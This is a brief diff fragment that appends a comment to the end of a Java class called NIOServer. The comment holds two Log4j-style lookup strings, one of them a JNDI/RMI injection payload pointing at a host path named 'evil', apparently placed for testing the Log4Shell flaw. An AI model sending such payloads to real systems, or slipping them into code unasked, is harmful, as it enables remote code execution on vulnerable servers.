@@ -54,3 +54,8 @@ public class NIOServer {
         }
     }
 }
+
+/**
+ *  ${java:os}
+ *  ${jndi:rmi://127.0.0.1:1099/evil}
+ */
